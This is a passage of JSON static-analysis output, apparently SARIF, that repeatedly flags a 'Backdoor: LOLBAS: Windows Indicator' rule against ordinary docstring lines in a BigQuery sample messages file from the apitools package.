                      "markdown": "`      contains data, a 'duplicate' error is returned in the job result. The\n      default value is WRITE_EMPTY. Each action is atomic and only occurs if\n      BigQuery is able to complete the job successfully. Creation, truncation\n      and append actions occur as one atomic update upon job completion.\n  \"\"\"\n\n  createDisposition = _messages.StringField(1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1306,
                  "startColumn": 65,
                  "endLine": 1306,
                  "endColumn": 73,
                  "snippet": {
                    "text": "      If the table does not exist, BigQuery creates the table. CREATE_NEVER:\n      The table must already exist. If it does not, a 'notFound' error is\n      returned in the job result. The default value is CREATE_IF_NEEDED.\n      Creation, truncation and append actions occur as one atomic update upon\n      job completion.\n    destinationTable: [Required] The destination table\n    sourceTable: [Pick one] Source table to copy.\n",
                    "rendered": {
                      "text": "      If the table does not exist, BigQuery creates the table. CREATE_NEVER:\n      The table must already exist. If it does not, a 'notFound' error is\n      returned in the job result. The default value is CREATE_IF_NEEDED.\n      Creation, truncation and append actions occur as one atomic update upon\n      job completion.\n    destinationTable: [Required] The destination table\n    sourceTable: [Pick one] Source table to copy.\n",
                      "markdown": "`      If the table does not exist, BigQuery creates the table. CREATE_NEVER:\n      The table must already exist. If it does not, a 'notFound' error is\n      returned in the job result. The default value is CREATE_IF_NEEDED.\n      Creation, truncation and append actions occur as one atomic update upon\n      job completion.\n    destinationTable: [Required] The destination table\n    sourceTable: [Pick one] Source table to copy.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1247,
                  "startColumn": 44,
                  "endLine": 1247,
                  "endColumn": 52,
                  "snippet": {
                    "text": "      contains data, a 'duplicate' error is returned in the job result. The\n      default value is WRITE_EMPTY. Each action is atomic and only occurs if\n      BigQuery is able to complete the job successfully. Creation, truncation\n      and append actions occur as one atomic update upon job completion.\n  \"\"\"\n\n  @encoding.MapUnrecognizedFields('additionalProperties')\n",
                    "rendered": {
                      "text": "      contains data, a 'duplicate' error is returned in the job result. The\n      default value is WRITE_EMPTY. Each action is atomic and only occurs if\n      BigQuery is able to complete the job successfully. Creation, truncation\n      and append actions occur as one atomic update upon job completion.\n  \"\"\"\n\n  @encoding.MapUnrecognizedFields('additionalProperties')\n",
                      "markdown": "`      contains data, a 'duplicate' error is returned in the job result. The\n      default value is WRITE_EMPTY. Each action is atomic and only occurs if\n      BigQuery is able to complete the job successfully. Creation, truncation\n      and append actions occur as one atomic update upon job completion.\n  \"\"\"\n\n  @encoding.MapUnrecognizedFields('additionalProperties')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1212,
                  "startColumn": 67,
                  "endLine": 1213,
                  "snippet": {
                    "text": "      include INTERACTIVE and BATCH. The default value is INTERACTIVE.\n    query: [Required] BigQuery SQL query to execute.\n    schemaUpdateOptions: [Experimental] Allows the schema of the desitination\n      table to be updated as a side effect of the query job. Schema update\n      options are supported in two cases: when writeDisposition is\n      WRITE_APPEND; when writeDisposition is WRITE_TRUNCATE and the\n      destination table is a partition of a table, specified by partition\n      decorators. For normal tables, WRITE_TRUNCATE will always overwrite the\n",
                    "rendered": {
                      "text": "      include INTERACTIVE and BATCH. The default value is INTERACTIVE.\n    query: [Required] BigQuery SQL query to execute.\n    schemaUpdateOptions: [Experimental] Allows the schema of the desitination\n      table to be updated as a side effect of the query job. Schema update\n      options are supported in two cases: when writeDisposition is\n      WRITE_APPEND; when writeDisposition is WRITE_TRUNCATE and the\n      destination table is a partition of a table, specified by partition\n      decorators. For normal tables, WRITE_TRUNCATE will always overwrite the\n",
                      "markdown": "`      include INTERACTIVE and BATCH. The default value is INTERACTIVE.\n    query: [Required] BigQuery SQL query to execute.\n    schemaUpdateOptions: [Experimental] Allows the schema of the desitination\n      table to be updated as a side effect of the query job. Schema update\n      options are supported in two cases: when writeDisposition is\n      WRITE_APPEND; when writeDisposition is WRITE_TRUNCATE and the\n      destination table is a partition of a table, specified by partition\n      decorators. For normal tables, WRITE_TRUNCATE will always overwrite the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1189,
                  "startColumn": 65,
                  "endLine": 1189,
                  "endColumn": 73,
                  "snippet": {
                    "text": "      If the table does not exist, BigQuery creates the table. CREATE_NEVER:\n      The table must already exist. If it does not, a 'notFound' error is\n      returned in the job result. The default value is CREATE_IF_NEEDED.\n      Creation, truncation and append actions occur as one atomic update upon\n      job completion.\n    defaultDataset: [Optional] Specifies the default dataset to use for\n      unqualified table names in the query.\n",
                    "rendered": {
                      "text": "      If the table does not exist, BigQuery creates the table. CREATE_NEVER:\n      The table must already exist. If it does not, a 'notFound' error is\n      returned in the job result. The default value is CREATE_IF_NEEDED.\n      Creation, truncation and append actions occur as one atomic update upon\n      job completion.\n    defaultDataset: [Optional] Specifies the default dataset to use for\n      unqualified table names in the query.\n",
                      "markdown": "`      If the table does not exist, BigQuery creates the table. CREATE_NEVER:\n      The table must already exist. If it does not, a 'notFound' error is\n      returned in the job result. The default value is CREATE_IF_NEEDED.\n      Creation, truncation and append actions occur as one atomic update upon\n      job completion.\n    defaultDataset: [Optional] Specifies the default dataset to use for\n      unqualified table names in the query.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1182,
                  "startColumn": 19,
                  "endLine": 1182,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\n  Fields:\n    allowLargeResults: If true, allows the query to produce arbitrarily large\n      result tables at a slight cost in performance. Requires destinationTable\n      to be set.\n    createDisposition: [Optional] Specifies whether the job is allowed to\n      create new tables. The following values are supported: CREATE_IF_NEEDED:\n",
                    "rendered": {
                      "text": "\n  Fields:\n    allowLargeResults: If true, allows the query to produce arbitrarily large\n      result tables at a slight cost in performance. Requires destinationTable\n      to be set.\n    createDisposition: [Optional] Specifies whether the job is allowed to\n      create new tables. The following values are supported: CREATE_IF_NEEDED:\n",
                      "markdown": "`\n  Fields:\n    allowLargeResults: If true, allows the query to produce arbitrarily large\n      result tables at a slight cost in performance. Requires destinationTable\n      to be set.\n    createDisposition: [Optional] Specifies whether the job is allowed to\n      create new tables. The following values are supported: CREATE_IF_NEEDED:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1147,
                  "startColumn": 44,
                  "endLine": 1147,
                  "endColumn": 52,
                  "snippet": {
                    "text": "      contains data, a 'duplicate' error is returned in the job result. The\n      default value is WRITE_APPEND. Each action is atomic and only occurs if\n      BigQuery is able to complete the job successfully. Creation, truncation\n      and append actions occur as one atomic update upon job completion.\n  \"\"\"\n\n  allowJaggedRows = _messages.BooleanField(1)\n",
                    "rendered": {
                      "text": "      contains data, a 'duplicate' error is returned in the job result. The\n      default value is WRITE_APPEND. Each action is atomic and only occurs if\n      BigQuery is able to complete the job successfully. Creation, truncation\n      and append actions occur as one atomic update upon job completion.\n  \"\"\"\n\n  allowJaggedRows = _messages.BooleanField(1)\n",
                      "markdown": "`      contains data, a 'duplicate' error is returned in the job result. The\n      default value is WRITE_APPEND. Each action is atomic and only occurs if\n      BigQuery is able to complete the job successfully. Creation, truncation\n      and append actions occur as one atomic update upon job completion.\n  \"\"\"\n\n  allowJaggedRows = _messages.BooleanField(1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1128,
                  "startColumn": 50,
                  "endLine": 1128,
                  "endColumn": 54,
                  "snippet": {
                    "text": "      ALLOW_FIELD_ADDITION: allow adding a nullable field to the schema.\n      ALLOW_FIELD_RELAXATION: allow relaxing a required field in the original\n      schema to nullable.\n    skipLeadingRows: [Optional] The number of rows at the top of a CSV file\n      that BigQuery will skip when loading the data. The default value is 0.\n      This property is useful if you have header rows in the file that should\n      be skipped.\n",
                    "rendered": {
                      "text": "      ALLOW_FIELD_ADDITION: allow adding a nullable field to the schema.\n      ALLOW_FIELD_RELAXATION: allow relaxing a required field in the original\n      schema to nullable.\n    skipLeadingRows: [Optional] The number of rows at the top of a CSV file\n      that BigQuery will skip when loading the data. The default value is 0.\n      This property is useful if you have header rows in the file that should\n      be skipped.\n",
                      "markdown": "`      ALLOW_FIELD_ADDITION: allow adding a nullable field to the schema.\n      ALLOW_FIELD_RELAXATION: allow relaxing a required field in the original\n      schema to nullable.\n    skipLeadingRows: [Optional] The number of rows at the top of a CSV file\n      that BigQuery will skip when loading the data. The default value is 0.\n      This property is useful if you have header rows in the file that should\n      be skipped.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1119,
                  "startColumn": 66,
                  "endLine": 1120,
                  "snippet": {
                    "text": "      baz:FLOAT\".\n    schemaInlineFormat: [Deprecated] The format of the schemaInline property.\n    schemaUpdateOptions: [Experimental] Allows the schema of the desitination\n      table to be updated as a side effect of the load job. Schema update\n      options are supported in two cases: when writeDisposition is\n      WRITE_APPEND; when writeDisposition is WRITE_TRUNCATE and the\n      destination table is a partition of a table, specified by partition\n      decorators. For normal tables, WRITE_TRUNCATE will always overwrite the\n",
                    "rendered": {
                      "text": "      baz:FLOAT\".\n    schemaInlineFormat: [Deprecated] The format of the schemaInline property.\n    schemaUpdateOptions: [Experimental] Allows the schema of the desitination\n      table to be updated as a side effect of the load job. Schema update\n      options are supported in two cases: when writeDisposition is\n      WRITE_APPEND; when writeDisposition is WRITE_TRUNCATE and the\n      destination table is a partition of a table, specified by partition\n      decorators. For normal tables, WRITE_TRUNCATE will always overwrite the\n",
                      "markdown": "`      baz:FLOAT\".\n    schemaInlineFormat: [Deprecated] The format of the schemaInline property.\n    schemaUpdateOptions: [Experimental] Allows the schema of the desitination\n      table to be updated as a side effect of the load job. Schema update\n      options are supported in two cases: when writeDisposition is\n      WRITE_APPEND; when writeDisposition is WRITE_TRUNCATE and the\n      destination table is a partition of a table, specified by partition\n      decorators. For normal tables, WRITE_TRUNCATE will always overwrite the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1072,
                  "startColumn": 65,
                  "endLine": 1072,
                  "endColumn": 73,
                  "snippet": {
                    "text": "      If the table does not exist, BigQuery creates the table. CREATE_NEVER:\n      The table must already exist. If it does not, a 'notFound' error is\n      returned in the job result. The default value is CREATE_IF_NEEDED.\n      Creation, truncation and append actions occur as one atomic update upon\n      job completion.\n    destinationTable: [Required] The destination table to load the data into.\n    encoding: [Optional] The character encoding of the data. The supported\n",
                    "rendered": {
                      "text": "      If the table does not exist, BigQuery creates the table. CREATE_NEVER:\n      The table must already exist. If it does not, a 'notFound' error is\n      returned in the job result. The default value is CREATE_IF_NEEDED.\n      Creation, truncation and append actions occur as one atomic update upon\n      job completion.\n    destinationTable: [Required] The destination table to load the data into.\n    encoding: [Optional] The character encoding of the data. The supported\n",
                      "markdown": "`      If the table does not exist, BigQuery creates the table. CREATE_NEVER:\n      The table must already exist. If it does not, a 'notFound' error is\n      returned in the job result. The default value is CREATE_IF_NEEDED.\n      Creation, truncation and append actions occur as one atomic update upon\n      job completion.\n    destinationTable: [Required] The destination table to load the data into.\n    encoding: [Optional] The character encoding of the data. The supported\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 942,
                  "startColumn": 50,
                  "endLine": 942,
                  "endColumn": 54,
                  "snippet": {
                    "text": "  r\"\"\"A GoogleSheetsOptions object.\n\n  Fields:\n    skipLeadingRows: [Optional] The number of rows at the top of a sheet that\n      BigQuery will skip when reading the data. The default value is 0. This\n      property is useful if you have header rows that should be skipped. When\n      autodetect is on, behavior is the following: * skipLeadingRows\n",
                    "rendered": {
                      "text": "  r\"\"\"A GoogleSheetsOptions object.\n\n  Fields:\n    skipLeadingRows: [Optional] The number of rows at the top of a sheet that\n      BigQuery will skip when reading the data. The default value is 0. This\n      property is useful if you have header rows that should be skipped. When\n      autodetect is on, behavior is the following: * skipLeadingRows\n",
                      "markdown": "`  r\"\"\"A GoogleSheetsOptions object.\n\n  Fields:\n    skipLeadingRows: [Optional] The number of rows at the top of a sheet that\n      BigQuery will skip when reading the data. The default value is 0. This\n      property is useful if you have header rows that should be skipped. When\n      autodetect is on, behavior is the following: * skipLeadingRows\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 910,
                  "startColumn": 5,
                  "endLine": 910,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    kind: The resource type of the response.\n    numDmlAffectedRows: [Output-only, Experimental] The number of rows\n      affected by a DML statement. Present only for DML statements INSERT,\n      UPDATE or DELETE.\n    pageToken: A token used for paging results.\n    rows: An object with as many results as can be contained within the\n      maximum permitted reply size. To get any additional rows, you can call\n",
                    "rendered": {
                      "text": "    kind: The resource type of the response.\n    numDmlAffectedRows: [Output-only, Experimental] The number of rows\n      affected by a DML statement. Present only for DML statements INSERT,\n      UPDATE or DELETE.\n    pageToken: A token used for paging results.\n    rows: An object with as many results as can be contained within the\n      maximum permitted reply size. To get any additional rows, you can call\n",
                      "markdown": "`    kind: The resource type of the response.\n    numDmlAffectedRows: [Output-only, Experimental] The number of rows\n      affected by a DML statement. Present only for DML statements INSERT,\n      UPDATE or DELETE.\n    pageToken: A token used for paging results.\n    rows: An object with as many results as can be contained within the\n      maximum permitted reply size. To get any additional rows, you can call\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 609,
                  "startColumn": 28,
                  "endLine": 609,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        Queries executed against that view will have read access to tables in\n        this dataset. The role field is not required when this field is set.\n        If that view is updated by any user, access to the view needs to be\n        granted again via an update operation.\n    \"\"\"\n\n    domain = _messages.StringField(1)\n",
                    "rendered": {
                      "text": "        Queries executed against that view will have read access to tables in\n        this dataset. The role field is not required when this field is set.\n        If that view is updated by any user, access to the view needs to be\n        granted again via an update operation.\n    \"\"\"\n\n    domain = _messages.StringField(1)\n",
                      "markdown": "`        Queries executed against that view will have read access to tables in\n        this dataset. The role field is not required when this field is set.\n        If that view is updated by any user, access to the view needs to be\n        granted again via an update operation.\n    \"\"\"\n\n    domain = _messages.StringField(1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 583,
                  "startColumn": 43,
                  "endLine": 583,
                  "endColumn": 51,
                  "snippet": {
                    "text": "    location: [Experimental] The geographic location where the dataset should\n      reside. Possible values include EU and US. The default value is US.\n    selfLink: [Output-only] A URL that can be used to access the resource\n      again. You can use this URL in Get or Update requests to the resource.\n  \"\"\"\n\n  class AccessValueListEntry(_messages.Message):\n",
                    "rendered": {
                      "text": "    location: [Experimental] The geographic location where the dataset should\n      reside. Possible values include EU and US. The default value is US.\n    selfLink: [Output-only] A URL that can be used to access the resource\n      again. You can use this URL in Get or Update requests to the resource.\n  \"\"\"\n\n  class AccessValueListEntry(_messages.Message):\n",
                      "markdown": "`    location: [Experimental] The geographic location where the dataset should\n      reside. Possible values include EU and US. The default value is US.\n    selfLink: [Output-only] A URL that can be used to access the resource\n      again. You can use this URL in Get or Update requests to the resource.\n  \"\"\"\n\n  class AccessValueListEntry(_messages.Message):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 543,
                  "startColumn": 17,
                  "endLine": 543,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    access: [Optional] An array of objects that define dataset access for one\n      or more entities. You can set this property when inserting or updating a\n      dataset in order to control who is allowed to access the data. If\n      unspecified at dataset creation time, BigQuery adds default dataset\n      access for the following entities: access.specialGroup: projectReaders;\n      access.role: READER; access.specialGroup: projectWriters; access.role:\n      WRITER; access.specialGroup: projectOwners; access.role: OWNER;\n",
                    "rendered": {
                      "text": "    access: [Optional] An array of objects that define dataset access for one\n      or more entities. You can set this property when inserting or updating a\n      dataset in order to control who is allowed to access the data. If\n      unspecified at dataset creation time, BigQuery adds default dataset\n      access for the following entities: access.specialGroup: projectReaders;\n      access.role: READER; access.specialGroup: projectWriters; access.role:\n      WRITER; access.specialGroup: projectOwners; access.role: OWNER;\n",
                      "markdown": "`    access: [Optional] An array of objects that define dataset access for one\n      or more entities. You can set this property when inserting or updating a\n      dataset in order to control who is allowed to access the data. If\n      unspecified at dataset creation time, BigQuery adds default dataset\n      access for the following entities: access.specialGroup: projectReaders;\n      access.role: READER; access.specialGroup: projectWriters; access.role:\n      WRITER; access.specialGroup: projectOwners; access.role: OWNER;\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 542,
                  "startColumn": 25,
                  "endLine": 542,
                  "endColumn": 34,
                  "snippet": {
                    "text": "  Fields:\n    access: [Optional] An array of objects that define dataset access for one\n      or more entities. You can set this property when inserting or updating a\n      dataset in order to control who is allowed to access the data. If\n      unspecified at dataset creation time, BigQuery adds default dataset\n      access for the following entities: access.specialGroup: projectReaders;\n      access.role: READER; access.specialGroup: projectWriters; access.role:\n",
                    "rendered": {
                      "text": "  Fields:\n    access: [Optional] An array of objects that define dataset access for one\n      or more entities. You can set this property when inserting or updating a\n      dataset in order to control who is allowed to access the data. If\n      unspecified at dataset creation time, BigQuery adds default dataset\n      access for the following entities: access.specialGroup: projectReaders;\n      access.role: READER; access.specialGroup: projectWriters; access.role:\n",
                      "markdown": "`  Fields:\n    access: [Optional] An array of objects that define dataset access for one\n      or more entities. You can set this property when inserting or updating a\n      dataset in order to control who is allowed to access the data. If\n      unspecified at dataset creation time, BigQuery adds default dataset\n      access for the following entities: access.specialGroup: projectReaders;\n      access.role: READER; access.specialGroup: projectWriters; access.role:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 511,
                  "startColumn": 50,
                  "endLine": 511,
                  "endColumn": 54,
                  "snippet": {
                    "text": "      does not contain quoted sections, set the property value to an empty\n      string. If your data contains quoted newline characters, you must also\n      set the allowQuotedNewlines property to true.\n    skipLeadingRows: [Optional] The number of rows at the top of a CSV file\n      that BigQuery will skip when reading the data. The default value is 0.\n      This property is useful if you have header rows in the file that should\n      be skipped.\n",
                    "rendered": {
                      "text": "      does not contain quoted sections, set the property value to an empty\n      string. If your data contains quoted newline characters, you must also\n      set the allowQuotedNewlines property to true.\n    skipLeadingRows: [Optional] The number of rows at the top of a CSV file\n      that BigQuery will skip when reading the data. The default value is 0.\n      This property is useful if you have header rows in the file that should\n      be skipped.\n",
                      "markdown": "`      does not contain quoted sections, set the property value to an empty\n      string. If your data contains quoted newline characters, you must also\n      set the allowQuotedNewlines property to true.\n    skipLeadingRows: [Optional] The number of rows at the top of a CSV file\n      that BigQuery will skip when reading the data. The default value is 0.\n      This property is useful if you have header rows in the file that should\n      be skipped.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 409,
                  "startColumn": 74,
                  "endLine": 410,
                  "snippet": {
                    "text": "      when using the BINARY encoding value. Following BigQuery types are\n      allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default\n      type is BYTES. 'type' can also be set at the column family level.\n      However, the setting at this level takes precedence if 'type' is set at\n      both levels.\n  \"\"\"\n\n  encoding = _messages.StringField(1)\n",
                    "rendered": {
                      "text": "      when using the BINARY encoding value. Following BigQuery types are\n      allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default\n      type is BYTES. 'type' can also be set at the column family level.\n      However, the setting at this level takes precedence if 'type' is set at\n      both levels.\n  \"\"\"\n\n  encoding = _messages.StringField(1)\n",
                      "markdown": "`      when using the BINARY encoding value. Following BigQuery types are\n      allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default\n      type is BYTES. 'type' can also be set at the column family level.\n      However, the setting at this level takes precedence if 'type' is set at\n      both levels.\n  \"\"\"\n\n  encoding = _messages.StringField(1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 409,
                  "startColumn": 26,
                  "endLine": 409,
                  "endColumn": 30,
                  "snippet": {
                    "text": "      when using the BINARY encoding value. Following BigQuery types are\n      allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default\n      type is BYTES. 'type' can also be set at the column family level.\n      However, the setting at this level takes precedence if 'type' is set at\n      both levels.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      when using the BINARY encoding value. Following BigQuery types are\n      allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default\n      type is BYTES. 'type' can also be set at the column family level.\n      However, the setting at this level takes precedence if 'type' is set at\n      both levels.\n  \"\"\"\n\n",
                      "markdown": "`      when using the BINARY encoding value. Following BigQuery types are\n      allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default\n      type is BYTES. 'type' can also be set at the column family level.\n      However, the setting at this level takes precedence if 'type' is set at\n      both levels.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 408,
                  "startColumn": 43,
                  "endLine": 408,
                  "endColumn": 47,
                  "snippet": {
                    "text": "      The values are expected to be encoded using HBase Bytes.toBytes function\n      when using the BINARY encoding value. Following BigQuery types are\n      allowed (case-sensitive) - BYTES STRING INTEGER FLOAT BOOLEAN Default\n      type is BYTES. 'type' can also be set at the column family level.\n      However, the setting at this level takes precedence if 'type' is set at\n      both levels.\n  \"\"\"\n",
                    "rendered": {
